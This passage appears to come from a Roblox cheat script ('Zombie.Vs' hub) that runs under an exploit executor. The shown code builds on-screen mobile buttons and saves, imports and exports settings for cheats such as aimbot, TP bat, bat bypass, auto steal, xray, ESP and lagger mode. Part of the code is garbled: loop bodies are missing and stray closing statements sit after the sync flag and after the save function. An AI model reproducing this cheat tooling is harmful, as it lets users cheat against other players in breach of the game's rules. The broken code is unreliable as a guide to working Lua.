    table.insert(_G.__ZombieWaveThemeRoots,root)
    root.DescendantAdded:Connect(function(d)
        task.defer(function() if d.Parent then F.applyWaveThemeObject(d,S.themeColor or Color3.fromRGB(45,130,230)) end end)
    end)
end
function F.refreshWaveTheme(col)
    for _,root in ipairs(_G.__ZombieWaveThemeRoots or {}) do
        if root.Parent then for _,d in ipairs(root:GetDescendants()) do F.applyWaveThemeObject(d,col) end end
    end
    if _G.__VersincApplyStealFillColor then _G.__VersincApplyStealFillColor(col) end
end
_G.VersincMobileButtonRefs = _G.VersincMobileButtonRefs or {}; _G.VersincMobileButtonPositions = _G.VersincMobileButtonPositions or {} function F.saveMobileButtonPositions() _G.VersincMobileButtonPositions = _G.VersincMobileButtonPositions or {} for k, entry in pairs(_G.VersincMobileButtonRefs or {}) do local h = entry and entry.holder if h and h.Parent then local p = h.Position _G.VersincMobileButtonPositions[k] = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset, } end end pcall(function() if F.saveConfig then F.saveConfig(true) end end) end
function F.applyMobileButtonsHidden() local function setEn(g) if g then g.Enabled = not (S.hideMobileButtons == true) end end pcall(function() if gethui then setEn(gethui():FindFirstChild("VersincMobileButtons")) end end) pcall(function() setEn(game:GetService("CoreGui"):FindFirstChild("VersincMobileButtons")) end) local pg = LP:FindFirstChild("PlayerGui") if pg then setEn(pg:FindFirstChild("VersincMobileButtons")) end end function F.applyMobileButtonSize()
    S.mobileButtonScale = math.clamp(tonumber(S.mobileButtonScale) or 0.70, 0.30, 2.00)
    local panel = _G.__VersincWaveMobilePanel
    if panel and panel.Parent then
        local sc = panel:FindFirstChild("MobileButtonScale") or Instance.new("UIScale", panel)
        sc.Name = "MobileButtonScale"
        sc.Scale = S.mobileButtonScale
    end
end function F.resetMobileButtons() S.mobileButtonScale = 0.70; S.hideMobileButtons = false; _G.VersincMobileButtonPositions = {}; F.buildMobileButtons(); F.applyMobileButtonSize(); F.applyMobileButtonsHidden() pcall(function() if F.saveConfig then F.saveConfig() end end) end function F.buildMobileButtons() if _G.__VersincBuildingMobile then return end
_G.__VersincBuildingMobile = true if type(_G.__VersincMobileInputConns) == "table" then for _, c in ipairs(_G.__VersincMobileInputConns) do pcall(function() c:Disconnect() end) end end _G.__VersincMobileInputConns = {}; local pg = LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui", 8) if not pg then _G.__VersincBuildingMobile = false; return end pcall(function() local function wipe(parent) if not parent then return end for _, ch in ipairs(parent:GetChildren()) do if ch.Name == "VersincMobileButtons" then pcall(function() ch:Destroy() end) end end end wipe(pg)
pcall(function() wipe(game:GetService("CoreGui")) end) pcall(function() if type(gethui) == "function" then wipe(gethui()) end end) end) _G.VersincMobileButtonRefs = {} _G.VersincMobileButtonPositions = _G.VersincMobileButtonPositions or {}; local isMobile = false pcall(function() if UIS.TouchEnabled then isMobile = true end end) local cam = workspace.CurrentCamera local vp = cam and cam.ViewportSize or Vector2.new(1280, 720) if vp.X < 900 or vp.Y < 600 then isMobile = true end pcall(function() if UIS.MouseEnabled and UIS.KeyboardEnabled and not UIS.TouchEnabled then isMobile = false end end)
S._isMobileLayout = isMobile local mobileGui = Instance.new("ScreenGui"); mobileGui.Name = "VersincMobileButtons"; mobileGui.ResetOnSpawn = false; mobileGui.IgnoreGuiInset = true; mobileGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling; mobileGui.DisplayOrder = 2147483647; mobileGui.Enabled = true; local parented = false pcall(function() if gethui then mobileGui.Parent = gethui(); parented = mobileGui.Parent ~= nil end end) if not parented then pcall(function() mobileGui.Parent = game:GetService("CoreGui"); parented = mobileGui.Parent ~= nil end) end if not parented then mobileGui.Parent = pg end
if S.hideMobileButtons ~= true then mobileGui.Enabled = true else mobileGui.Enabled = false end F.registerWaveThemeRoot(mobileGui)
local panel = Instance.new("Frame",mobileGui)
panel.Name = "MobileStackPanel"; panel.AnchorPoint = Vector2.new(1,0.5)
panel.Position = UDim2.new(1,-16,0.5,0); panel.Size = UDim2.new(0,154,0,426)
panel.BackgroundColor3 = Color3.fromRGB(4,10,28); panel.BackgroundTransparency = 1; panel.BorderSizePixel = 0; panel.ZIndex = 1000; panel.Active = false
-- Fundo removido: mantem o painel transparente para nao interceptar os botoes
_G.__VersincWaveMobilePanel = panel
local mobileButtons = _G.VersincMobileButtonRefs local function udimFromSaved(key, default) local store = _G.VersincMobileButtonPositions or {}; local s = store[key] if type(s) ~= "table" then return default end local xs = tonumber(s.xs); local ys = tonumber(s.ys) if xs == nil or ys == nil then return default end local xo = tonumber(s.xo) or 0; local yo = tonumber(s.yo) or 0 return UDim2.new(xs, xo, ys, yo) end local function savePos(key, holder) if not holder then return end
local p = holder.Position; _G.VersincMobileButtonPositions = _G.VersincMobileButtonPositions or {} _G.VersincMobileButtonPositions[key] = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset, } for k, entry in pairs(_G.VersincMobileButtonRefs or {}) do local h = entry and entry.holder if h and h.Parent then local hp = h.Position _G.VersincMobileButtonPositions[k] = { xs = hp.X.Scale, xo = hp.X.Offset, ys = hp.Y.Scale, yo = hp.Y.Offset, } end end end local function persistMobilePositions() pcall(function() if F.saveConfig then F.saveConfig(true) end end) end
local function setActive(btn,state)
    if not btn or not btn.Parent then return end
    state = state == true or btn:GetAttribute("Pressed") == true
    local visual = state and "on" or "off"
    if btn:GetAttribute("VisualState") == visual then return end
    btn:SetAttribute("VisualState",visual)
    local grad = btn:FindFirstChild("BtnGrad"); if grad then grad.Enabled = false end
    TS:Create(btn,TweenInfo.new(0.15),{BackgroundColor3 = state and Color3.new((S.themeColor or Color3.fromRGB(45,130,230)).R*0.35,(S.themeColor or Color3.fromRGB(45,130,230)).G*0.35,(S.themeColor or Color3.fromRGB(45,130,230)).B*0.35) or Color3.new((S.themeColor or Color3.fromRGB(45,130,230)).R*0.12,(S.themeColor or Color3.fromRGB(45,130,230)).G*0.12,(S.themeColor or Color3.fromRGB(45,130,230)).B*0.12)}):Play()
    local lbl = btn:FindFirstChild("MBLabel"); if lbl then lbl.TextColor3 = S.themeColor or Color3.fromRGB(255,255,255) end
    local st = btn:FindFirstChildOfClass("UIStroke"); if st then st.Color = Color3.fromRGB(14,32,68); st.Transparency = 0; st.Thickness = 1 end
end _G._VersincApplyMobileTheme = function(col) S.themeColor = col pcall(function() if _G.__VersincApplyStealFillColor then _G.__VersincApplyStealFillColor(col) end end) for _, entry in pairs(mobileButtons) do local btn = entry and entry.btn if btn and btn.Parent then local st = btn:GetAttribute("VisualState"); btn:SetAttribute("VisualState", nil); setActive(btn, st == "on") end end end local function refreshAllMobileStates() for key, entry in pairs(mobileButtons) do local btn = entry and entry.btn if btn then local keep = false if key == "autoLeft" then keep = S.autoLeftEnabled == true
elseif key == "autoRight" then keep = S.autoRightEnabled == true elseif key == "aimbot" then keep = (tpBatEnabled == true) or (aimbotEnabled == true) elseif key == "autoBat" then keep = S.autoBatEnabled == true elseif key == "batV2" then keep = S.autoBatV2Enabled == true elseif key == "carry" then keep = S.speedMode == true and not S.laggerToggled elseif key == "lagger" then keep = S.laggerToggled == true and S.laggerPhase == 1 elseif key == "laggerCarry" then keep = S.laggerToggled == true and S.laggerPhase == 2 elseif key == "antitp" then keep = (_G.__AntiTPBatEnabled == true) end setActive(btn, keep) end end end
_G._VersincRefreshMobileButtons = refreshAllMobileStates local function pulse(btn) if not btn then return end btn:SetAttribute("Pressed", true); setActive(btn, true) task.delay(0.15, function() if btn and btn.Parent then btn:SetAttribute("Pressed", false); refreshAllMobileStates() end end) end local btnW, btnH = 58, 58 local function makeButton(key, label, pos, onPress)
local holder = Instance.new("Frame"); holder.Name = "MBH_" .. key; holder.Size = UDim2.new(0, btnW, 0, btnH); holder.Position = udimFromSaved(key, pos); holder.BackgroundTransparency = 1; holder.ZIndex = 1000; holder.Active = false; holder.Parent = panel; local btn = Instance.new("TextButton"); btn.Name = "MB_" .. key; btn.Size = UDim2.new(1, 0, 1, 0); btn.BackgroundColor3 = Color3.fromRGB(8, 18, 48); btn.BackgroundTransparency = 0.1; btn.BorderSizePixel = 0; btn.Text = ""; btn.TextColor3 = Color3.fromRGB(32, 32, 40); btn.Font = Enum.Font.GothamBlack; btn.TextSize = 11; btn.TextWrapped = true; btn.AutoButtonColor = false; btn.ZIndex = 1002; btn.Active = true; btn.Selectable = true; btn:SetAttribute("ThemeMobile", true); btn.Parent = holder; Instance.new("UICorner", btn).CornerRadius = S.circleButtons == true and UDim.new(1, 0) or UDim.new(0, 10); local bgGrad = Instance.new("UIGradient", btn); bgGrad.Enabled = false; bgGrad.Name = "BtnGrad"; bgGrad.Rotation = 90; bgGrad.Color = ColorSequence.new(Color3.fromRGB(30, 34, 40), Color3.fromRGB(10, 14, 19)); local stroke = Instance.new("UIStroke", btn); stroke.Color = Color3.fromRGB(110, 94, 74); stroke.Thickness = 1; stroke.Transparency = 0.54; local blabel = Instance.new("TextLabel", btn); blabel.Name = "MBLabel"; blabel.Size = UDim2.new(1, -10, 1, -10); blabel.Position = UDim2.new(0, 5, 0, 5); blabel.BackgroundTransparency = 1; blabel.Text = label; blabel.TextColor3 = Color3.fromRGB(255, 255, 255); blabel.Font = Enum.Font.GothamBlack; blabel.TextSize = 9; blabel.TextWrapped = true; blabel.ZIndex = 1003; local sdot = Instance.new("Frame", btn); sdot.Name = "StatusDot"; sdot.Visible = false; sdot.Size = UDim2.new(0, 4, 0, 4); sdot.Position = UDim2.new(1, -10, 0, 8); sdot.BackgroundColor3 = Color3.fromRGB(65, 72, 81); sdot.BorderSizePixel = 0; sdot.ZIndex = 1004; Instance.new("UICorner", sdot).CornerRadius = UDim.new(0, 2); local sst = Instance.new("TextLabel", btn); sst.Name = "Status"; sst.Visible = false; sst.BackgroundTransparency = 1; sst.Size = UDim2.new(1, -10, 0, 9); sst.Position = UDim2.new(0, 5, 1, -14); sst.Text = "OFF"; sst.TextColor3 = Color3.fromRGB(126, 132, 139); sst.Font = Enum.Font.GothamMedium; sst.TextSize = 7; sst.ZIndex = 1004; local pressing, dragging = false, false; local pressPos, holderStart = nil, nil; local fired = false
local function fireAction() if fired then return end fired = true pcall(function() if onPress then onPress(btn) end end) task.defer(refreshAllMobileStates) task.delay(0.25, function() fired = false end) end local function beginPress(input) pressing = true; dragging = false; fired = false; pressPos = input.Position; holderStart = holder.Position; btn:SetAttribute("Pressed", true); setActive(btn, true) end local function endPress() if not pressing then return end if pressing and not dragging then fireAction() end if dragging then savePos(key, holder); persistMobilePositions() end
pressing = false; dragging = false; btn:SetAttribute("Pressed", false); task.delay(0.05, refreshAllMobileStates) end btn.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then beginPress(input) end end) local function track(conn) if conn then _G.__VersincMobileInputConns = _G.__VersincMobileInputConns or {}; table.insert(_G.__VersincMobileInputConns, conn) end return conn end track(UIS.InputEnded:Connect(function(input) if not pressing then return end
if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then endPress() end end)) track(UIS.InputChanged:Connect(function(input) if not pressing then return end if S.allLockButtons == true or S.lockMobileButtons == true or S.moveButtons ~= true then return end if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end if not pressPos then return end local delta = (input.Position - pressPos) / ((panel:FindFirstChild("MobileButtonScale") and panel.MobileButtonScale.Scale) or 1); local thresh = isMobile and 18 or 8
if not dragging and (math.abs(delta.X) > thresh or math.abs(delta.Y) > thresh) then dragging = true end if dragging and holderStart then holder.Position = UDim2.new(holderStart.X.Scale, holderStart.X.Offset + delta.X, holderStart.Y.Scale, holderStart.Y.Offset + delta.Y) end end)) btn.Activated:Connect(function() if dragging then return end if pressing then endPress() else fireAction() end end) mobileButtons[key] = {holder = holder, btn = btn, setActive = function(state) setActive(btn, state) end} setActive(btn, false) return btn end local defaults do
    local function slot(c,r) return UDim2.new(0,14+(c-1)*68,0,14+(r-1)*68) end
    defaults = {autoLeft=slot(1,1),autoRight=slot(2,1),aimbot=slot(1,2),lagger=slot(2,2),drop=slot(1,3),laggerCarry=slot(2,3),tp=slot(1,4),carry=slot(2,4),instaReset=slot(2,5),autoBat=slot(1,6),batV2=slot(2,6)}
end makeButton("instaReset", "INSTA\nRESET", defaults.instaReset, function(btn) if _G.ZombieFireInstaReset then _G.ZombieFireInstaReset() end pulse(btn) end) makeButton("drop", "DROP\nBR", defaults.drop, function(btn) if F.runDrop then F.runDrop() end pulse(btn) end) makeButton("autoLeft", "AUTO\nLEFT", defaults.autoLeft, function() if S.autoLeftEnabled then S.autoLeftEnabled = false if F.stopAutoLeft then F.stopAutoLeft() end if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end else if F.queueAutoLeftStart then F.queueAutoLeftStart() end
if S.autoLeftSetVisual then S.autoLeftSetVisual(S.autoLeftEnabled) end end end) makeButton("batV2", "BAT\nBYPASS", defaults.batV2, function() if F.toggleBatV2 then F.toggleBatV2() end end) makeButton("autoBat", "BAT\nAIMBOT", defaults.autoBat, function() if S.autoBatEnabled then S.autoBatEnabled = false if S.disableAutoBat then S.disableAutoBat() end if S.autoBatSetVisual then S.autoBatSetVisual(false) end else if F.queueAutoBatStart then F.queueAutoBatStart() end if S.autoBatSetVisual then S.autoBatSetVisual(S.autoBatEnabled) end end end) makeButton("aimbot", "TP\nBAT", defaults.aimbot, function() if F.safeModeTryStart and not F.safeModeTryStart() then return end
if setTPBatState then setTPBatState(not tpBatEnabled) end if VS.setTPBatVisual then VS.setTPBatVisual(tpBatEnabled) end end) makeButton("autoRight", "AUTO\nRIGHT", defaults.autoRight, function() if S.autoRightEnabled then S.autoRightEnabled = false if F.stopAutoRight then F.stopAutoRight() end if S.autoRightSetVisual then S.autoRightSetVisual(false) end else if F.queueAutoRightStart then F.queueAutoRightStart() end if S.autoRightSetVisual then S.autoRightSetVisual(S.autoRightEnabled) end end end) makeButton("tp", "TP\nDOWN", defaults.tp, function(btn) if F.runTPFloor then F.runTPFloor() end
pulse(btn) end) makeButton("carry", "CARRY\nSPD", defaults.carry, function() if F.toggleCarryMode then F.toggleCarryMode() end if F.refreshSpeedModeLabel then F.refreshSpeedModeLabel() end end) makeButton("lagger", "LAGGER\nMODE", defaults.lagger, function() if S.laggerToggled and S.laggerPhase == 1 then S.laggerToggled = false; S.laggerPhase = 0 else S.speedMode = false; S.laggerToggled = true; S.laggerPhase = 1 end if F.refreshSpeedModeLabel then F.refreshSpeedModeLabel() end end) makeButton("laggerCarry", "LAGGER\nCARRY", defaults.laggerCarry, function()
if S.laggerToggled and S.laggerPhase == 2 then S.laggerToggled = false; S.laggerPhase = 0 else S.speedMode = false; S.laggerToggled = true; S.laggerPhase = 2 end if F.refreshSpeedModeLabel then F.refreshSpeedModeLabel() end end) if not S.mobileButtonScale then S.mobileButtonScale = 0.70 end F.applyMobileButtonSize(); F.applyMobileButtonsHidden() task.defer(function() refreshAllMobileStates() if S.themeColor and _G._VersincApplyMobileTheme then pcall(function() _G._VersincApplyMobileTheme(S.themeColor) end) end end)
-- [FIX] Sync visual state dos botoes (Auto Left / Auto Right e afins) quando a funcao para sozinha
_G.__VersincRefreshMobileStates = refreshAllMobileStates local function _fpStateSig() return tostring(S.autoLeftEnabled == true) .. tostring(S.autoRightEnabled == true) .. tostring(S.autoBatEnabled == true) .. tostring(S.autoBatV2Enabled == true) .. tostring(tpBatEnabled == true) .. tostring(_G.__AntiTPBatEnabled == true) .. tostring(S.speedMode == true) .. tostring(S.laggerToggled == true) .. tostring(S.laggerPhase) end
if _G.__VersincVisualSyncLoop then _G.__VersincVisualSyncLoop = false end
_G.__VersincVisualSyncLoop = true
_G.__VersincRefreshMobileStates = refreshAllMobileStates

    end
    task.wait(0.1)
  end
end)
_G.__VersincBuildingMobile = false end function F.saveConfig(force) if not _writefile then S._lastSaveOk = false if UI and UI.saveStatusLbl then UI.saveStatusLbl.Text = "Save: no writefile"; UI.saveStatusLbl.TextColor3 = Color3.fromRGB(255, 120, 120) end return false end local ok, err; do local __m = {pcall(function() local function ks(e) if type(e) ~= "table" then return {kb=nil,gp=nil} end return {kb = e.kb and e.kb.Name or nil, gp = e.gp and e.gp.Name or nil} end local function numFromBox(box, fallback) if box and box.Text then local n = tonumber(box.Text) if n then return n end end return fallback end
if UI then local v v = numFromBox(UI.radInput, nil) if v and v > 0 then autoStealRadius = v; Steal.StealRadius = v end v = numFromBox(UI.stealDurInput, nil) if v and v >= 0.1 then Steal.StealDuration = v end v = numFromBox(UI.stopTimeInput, nil) if v and v > 0 then autoGrabStopTime = v; Steal.AutoGrabStopTime = v end v = numFromBox(UI.delayRadInput, nil) if v and v > 0 then autoGrabDelayRadius = v; Steal.AutoGrabDelayRadius = v end v = numFromBox(UI.normalBox, nil) if v and v > 0 then NS = v end v = numFromBox(UI.carryBox, nil) if v and v > 0 then CS = v end v = numFromBox(UI.autoBatSpeedBox, nil) if v and v > 0 then S.AUTO_BAT_SPEED = math.clamp(v, 1, 500) end v = numFromBox(UI.laggerBox, nil)
if v and v > 0 then S.LAGGER_SPEED = v end v = numFromBox(UI.laggerCarryBox, nil) if v and v > 0 then S.LAGGER_CARRY_SPEED = v end v = numFromBox(UI.autoTPHeightBox, nil) if v then S.autoTPHeight = v end end
local stealRad = tonumber(autoStealRadius) or (Steal and Steal.StealRadius) or 20; local stealDur = (Steal and tonumber(Steal.StealDuration)) or 1.3; local stopT = tonumber(autoGrabStopTime) or (Steal and tonumber(Steal.AutoGrabStopTime)) or 1.00; local delayR = tonumber(autoGrabDelayRadius) or (Steal and tonumber(Steal.AutoGrabDelayRadius)) or 8; autoGrabStopTime = stopT; autoGrabDelayRadius = delayR if Steal then
Steal.StealRadius = stealRad; Steal.StealDuration = stealDur; Steal.AutoGrabStopTime = stopT; Steal.AutoGrabDelayRadius = delayR; Steal.AutoGrabStopEnabled = autoGrabStopEnabled == true end local cfg = { normalSpeed = NS, carrySpeed = CS, dropBrainrotKey = ks(KB.DropBrainrot), autoLeftKey = ks(KB.AutoLeft), autoRightKey = ks(KB.AutoRight), autoBatKey = ks(KB.AutoBat), tpBatKey = ks(KB.TPBat), laggerToggleKey = ks(KB.LaggerToggle), tpFloorKey = ks(KB.TPFloor), instaResetKey = ks(KB.InstaReset), antiTpBatKey = ks(KB.AntiTPBat), batV2Key = ks(KB.BatV2), guiHideKey = ks(KB.GuiHide), speedToggleKey = ks(KB.SpeedToggle),
grabRadius = stealRad, stealDuration = stealDur, selectedStealMode = selectedStealMode, aceStealRadii = AceStealRadii and { Normal = AceStealRadii.Normal, Semi = AceStealRadii.Semi } or nil, autoGrabStopEnabled = autoGrabStopEnabled == true, autoGrabStopTime = stopT, autoGrabDelayRadius = delayR, ragdollStealEnabled = S.ragdollStealEnabled == true, antiRagdollMode = S.antiRagdollMode or 1, aimbotMode = 1, antiRagdoll = S.antiRagdollEnabled, antiDieEnabled = S.antiDieEnabled, antiFlingShieldEnabled = S.antiFlingShieldEnabled, duelsAntiDropEnabled = S.duelsAntiDropEnabled, mysteryAntiBatEnabled = S.mysteryAntiBatEnabled, removeAccessories = S.removeAccessoriesEnabled, motionBlurEnabled = S.motionBlurEnabled, xrayBasesEnabled = S.xrayBasesEnabled, xrayBrainrotsEnabled = S.xrayBrainrotsEnabled, autoStealEnabled = autoStealEnabled,
medusaCounter = S.medusaCounterEnabled, medusaReset = S.medusaResetEnabled, batCounter = S.batCounterEnabled, infJump = infJumpEnabled, aimbot = aimbotEnabled, tpBat = tpBatEnabled, antiBatBypass = false, aimbotSpeed = (F.getAimbotSpeeds and select(1, F.getAimbotSpeeds())) or 58, aimbotLaggerSpeed = (F.getAimbotSpeeds and select(2, F.getAimbotSpeeds())) or 40, autoLeft = S.autoLeftEnabled == true, autoRight = S.autoRightEnabled == true, tpBatMode = tpBatMode, tpBatSpeed = S.tpBatSpeed or 40, outfitSel = S.outfitSel, outfitOn = S.outfitOn == true, antiTpBatMode = AntiTPBat.mode, antiTpBatEnabled = AntiTPBat.enabled == true, tpBatLegacyKey = (TP_BAT_KEY and TP_BAT_KEY.Name) or "V", carryMode = S.speedMode, laggerMode = S.laggerToggled, laggerCarryMode = S.laggerPhase == 2, autoCarrySpeedEnabled = S.autoCarrySpeedEnabled,
noPlayerCollisionEnabled = S.noPlayerCollisionEnabled, safeModeEnabled = S.safeModeEnabled, autoResetOnMedEnabled = S.autoResetOnMedEnabled, laggerSpeed = S.LAGGER_SPEED, laggerCarrySpeed = S.LAGGER_CARRY_SPEED, autoBat = S.autoBatEnabled, autoBatSpeed = math.clamp(tonumber(S.AUTO_BAT_SPEED) or 58, 1, 500), autoBatV2 = S.autoBatV2Enabled == true, autoSwing = S.autoSwingEnabled, informationE01 = S.informationE01Enabled ~= false, unwalkEnabled = S.unwalkEnabled, antiLag = S.antiLagEnabled, keyboardOverlay = S.keyboardOverlayEnabled == true, customToolsEnabled = S.customToolsEnabled == true, rainbowToolsEnabled = S.rainbowToolsEnabled == true, rainbowJoystickEnabled = S.rainbowJoystickEnabled == true, transparentToolsEnabled = S.transparentToolsEnabled == true, customSoundsEnabled = S.customSoundsEnabled == true, customToolSkinBat = S.customToolSkinBat, customToolSkinMedusa = S.customToolSkinMedusa, stretchRez = S.stretchRezEnabled, autoTPEnabled = S.autoTPEnabled, autoTPHeight = S.autoTPHeight, skyTheme = K7 and K7.currentSkyTheme or nil, fovEnabled = K7 and K7.fovEnabled or false,
fovValue = (K7 and K7.fovValue) or (_G._VezyFOV) or 70, headless = K7 and K7.headlessEnabled or false, korbloxSide = korbloxSide or (K7 and K7.korbloxSide) or 1, korblox = K7 and K7.korbloxEnabled or false, bodyLock = K7 and K7.bodyLockEnabled or false, bodyLockRadius = K7 and K7.bodyLockRadius or 60, lineESP = K7 and K7.lineESPEnabled or false, speedESP = K7 and K7.speedESPEnabled or false, animPackEnabled = K7 and K7.animPackEnabled or false, animPack = K7 and K7.animPackName or nil, animPackIndex = K7 and K7.animPackIndex or 1,
guiScale = (_G._VersincGetGuiScale and _G._VersincGetGuiScale()) or 1, themeName = S.currentThemeName or currentThemeName or "WHITE", bgId = S.currentBgId or "", bgIntensity = S.bgIntensity or 0.58, autoSaveEnabled = S.autoSaveEnabled, showTracerEnabled = S.showTracerEnabled, ragdollCountdownEnabled = S.ragdollCountdownEnabled, guiLocked = S.guiLocked, hubPos = S.hubPos, miniPos = S.miniPos, hideMobileButtons = S.hideMobileButtons, lockMobileButtons = S.lockMobileButtons == true, allLockButtons = S.allLockButtons == true, moveButtons = S.moveButtons == true, circleButtons = S.circleButtons == true,
progressBarScale = S.progressBarScale or 100, stealBarPos = S.stealBarPos, whiteBarEnabled = S.whiteBarEnabled == true, keyboardOverlay = S.keyboardOverlayEnabled == true, customToolsEnabled = S.customToolsEnabled == true, rainbowToolsEnabled = S.rainbowToolsEnabled == true, transparentToolsEnabled = S.transparentToolsEnabled == true, customSoundsEnabled = S.customSoundsEnabled == true, customToolSkinBat = S.customToolSkinBat, customToolSkinMedusa = S.customToolSkinMedusa, mobileButtonScale = S.mobileButtonScale, infJumpMode = S.infJumpMode or "hold", mirrorTPDown = S.mirrorTPDownEnabled == true, introEnabled = S.introEnabled ~= false, accessoryPackEnabled = K7 and K7.accessoryPackEnabled or false, accessoryPack = K7 and K7.accessoryPackName or nil, accessoryPackIndex = K7 and K7.accessoryPackIndex or 1, skyThemeIndex = K7 and K7.skyThemeIndex or nil, outfitSel = S.outfitSel, outfitOn = S.outfitOn == true, mobileLayout = "wave-stack-v4", mobileButtonPositions = _G.VersincMobileButtonPositions, avatarChanger = (function() local ok,d=pcall(function() return AvatarChanger.export() end) if ok then return d else return nil end end)(), } local encoded = HS:JSONEncode(cfg) _writefile(CONFIG_FILE, encoded) pcall(function() _writefile(CONFIG_FILE_LEGACY, encoded) end) end)}; ok = __m[1]; err = __m[2]; end S._lastSaveOk = ok and true or false S._lastSaveAt = tick() if UI and UI.saveStatusLbl then if ok then
UI.saveStatusLbl.Text = "Saved OK"; UI.saveStatusLbl.TextColor3 = Color3.fromRGB(100, 220, 160) else UI.saveStatusLbl.Text = "Save failed"; UI.saveStatusLbl.TextColor3 = Color3.fromRGB(255, 120, 120); warn("[Zombie.Vs] F.saveConfig error:", err) end end return ok end  end end end)  CONFIG_EXPORT_FILE = "ZombieVSHub_Export.json"
 CONFIG_IMPORT_FILE = "ZombieVSHub_Import.json";  _setclipboard = setclipboard or toclipboard or (syn and syn.write_clipboard);  _getclipboard = getclipboard or (syn and syn.read_clipboard) function F.saveMobileButtonsOnly() if not _writefile then return false end local ok = pcall(function() local raw = nil if _isfile(CONFIG_FILE) then pcall(function() raw = _readfile(CONFIG_FILE) end) end local cfg = {} if raw and raw ~= "" then pcall(function() cfg = HS:JSONDecode(raw) or {} end) end if type(cfg) ~= "table" then cfg = {} end
cfg.mobileLayout = "wave-stack-v4"; cfg.mobileButtonPositions = _G.VersincMobileButtonPositions or cfg.mobileButtonPositions; cfg.mobileButtonScale = S.mobileButtonScale; cfg.hideMobileButtons = S.hideMobileButtons == true; cfg.lockMobileButtons = S.lockMobileButtons == true; cfg.allLockButtons = S.allLockButtons == true; cfg.moveButtons = S.moveButtons == true; cfg.circleButtons = S.circleButtons == true; cfg.progressBarScale = S.progressBarScale or 100; _writefile(CONFIG_FILE, HS:JSONEncode(cfg)) end) return ok == true end function F.exportConfig() local okSnap = pcall(function() if F.saveConfig then F.saveConfig(true) end end) local raw = nil
if _isfile(CONFIG_FILE) then pcall(function() raw = _readfile(CONFIG_FILE) end) end if not raw or raw == "" then return false, "no_config" end pcall(function() _writefile(CONFIG_EXPORT_FILE, raw) end) local copied = false if _setclipboard then copied = pcall(_setclipboard, raw) end return true, copied and "copied_and_exported" or "exported_to_file" end function F.importConfig(pastedText) local raw = tostring(pastedText or ""):match("^%s*(.-)%s*$") or "" if raw == "" and _getclipboard then local clipOk, clip; do local __m = {pcall(_getclipboard)}; clipOk = __m[1]; clip = __m[2]; end
if clipOk and type(clip) == "string" then raw = clip:match("^%s*(.-)%s*$") or "" end end if raw == "" and _isfile(CONFIG_IMPORT_FILE) then pcall(function() raw = tostring(_readfile(CONFIG_IMPORT_FILE) or ""):match("^%s*(.-)%s*$") or "" end) end if raw == "" then return false, "empty" end local valid, decoded; do local __m = {pcall(function() return HS:JSONDecode(raw) end)}; valid = __m[1]; decoded = __m[2]; end if not valid or type(decoded) ~= "table" then return false, "invalid_json" end local encodedOk, normalized; do local __m = {pcall(function() return HS:JSONEncode(decoded) end)}; encodedOk = __m[1]; normalized = __m[2]; end if not encodedOk then return false, "encode_failed" end
pcall(function() _writefile(CONFIG_FILE, normalized) end) _savedCfg = decoded pcall(function() if F.loadConfigKeys then F.loadConfigKeys() end if F.loadConfigState then F.loadConfigState() end end) return true, "imported" end function F.resetAllConfig() pcall(function() if S.antiRagdollEnabled then S.antiRagdollEnabled=false; F.stopAntiRagdoll() end end) pcall(function() if infJumpEnabled then infJumpEnabled=false; F.stopInfJump() end end) pcall(function() if tpBatEnabled and setTPBatState then setTPBatState(false) end end) pcall(function() AntiTPBat.set(false); AntiTPBat.setMode("v1") end)
pcall(function() if aimbotEnabled and setAimbotState then setAimbotState(false) end end) pcall(function() if S.autoBatEnabled and S.disableAutoBat then S.autoBatEnabled=false; S.disableAutoBat() end end) pcall(function() if S.laggerToggled then S.laggerToggled=false; S.laggerPhase=0 end end) pcall(function() if S.speedMode then S.speedMode=false end end) pcall(function() if S.autoTPEnabled and F.stopAutoTP then F.stopAutoTP() end end) pcall(function() if S.unwalkEnabled and F.stopUnwalk then S.unwalkEnabled=false; F.stopUnwalk() end end)
pcall(function() if S.antiLagEnabled and F.disableAntiLag then F.disableAntiLag() end end) pcall(function() if F.stopKeyboardOverlay then F.stopKeyboardOverlay() end end) pcall(function() ToolEditor.setEnabled(false); ToolEditor.setRainbow(false); ToolEditor.setTransparency(false); ToolEditor.setSounds(false) end) pcall(function() AvatarChanger.reset() end) pcall(function() if S.stretchRezEnabled and disableStretchRez then disableStretchRez() end end) pcall(function() if S.showTracerEnabled and F.setShowTracer then F.setShowTracer(false) end end) pcall(function() if S.ragdollCountdownEnabled and F.setRagdollCountdown then F.setRagdollCountdown(false) end end) pcall(function() if S.noPlayerCollisionEnabled and F.disableNoPlayerCollision then F.disableNoPlayerCollision() end end)
pcall(function() if autoStealEnabled and stopAutoSteal then stopAutoSteal() end end) pcall(function() if S.batCounterEnabled and S.stopBatCounter then S.batCounterEnabled=false; S.stopBatCounter() end end) pcall(function() if S.medusaCounterEnabled or S.medusaResetEnabled then S.medusaCounterEnabled=false; S.medusaResetEnabled=false end end) pcall(function() if S.autoResetOnMedEnabled and F.setAutoResetOnMed then F.setAutoResetOnMed(false) end end)
